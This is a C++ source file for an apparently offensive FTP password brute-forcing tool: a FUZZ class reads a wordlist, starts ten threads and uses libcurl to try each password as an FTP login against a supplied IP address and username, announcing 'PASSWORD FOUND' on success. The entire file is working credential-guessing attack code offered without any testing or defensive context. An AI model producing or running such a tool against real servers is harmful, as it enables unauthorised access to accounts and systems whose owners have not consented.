
#include "./include/FUZZ.hpp"


FUZZ::FUZZ(std::string name, std::string IP, std::string user) 
    : nameFile(name), file(nameFile), IP(IP), user(user)
{
    if (!file.is_open())
    {
        std::cout << "can't open file " << std::endl;
        exit(1);
    }
}

void FUZZ::creatThread()
{
    std::vector<std::thread> threadPool;
    for (int i = 0; i < 10; i++)
    {
        threadPool.emplace_back(&FUZZ::Broot, this);
    }
    for (auto &t : threadPool)
    {
        t.join();
    }
}



int FUZZ::cheack(std::string pass)
{
    std::string curlFtp = "ftp://" + IP + "/";

    CURL *curl = curl_easy_init();
    if (!curl)
        return 0;

    curl_easy_setopt(curl, CURLOPT_URL, curlFtp.c_str());
    curl_easy_setopt(curl, CURLOPT_USERPWD, (user + ":" + pass).c_str());
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // no download

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        std::lock_guard<std::mutex> lock(lock_print);
        std::cout << "\n[SUCCESS] PASSWORD FOUND: " << pass << std::endl;
        curl_easy_cleanup(curl);
        exit(0);
    } else {
        std::lock_guard<std::mutex> lock(lock_print);
        std::cout << "[FAIL] " << pass << std::endl;
    }

    curl_easy_cleanup(curl);
    return 0;
}

void    FUZZ::Broot()
{
    while (true)
    {
        std::string line;
        {
            std::lock_guard<std::mutex> lock(lock_file);
            if (!getline(file, line))
                return;
            if (line.empty())
                continue;
            cheack(line);
        }
        // {
        //     // std::lock_guard<std::mutex> lock(lock_print);
            
        //     // std::cout << "line is : " << line << std::endl;
        // }
    }
}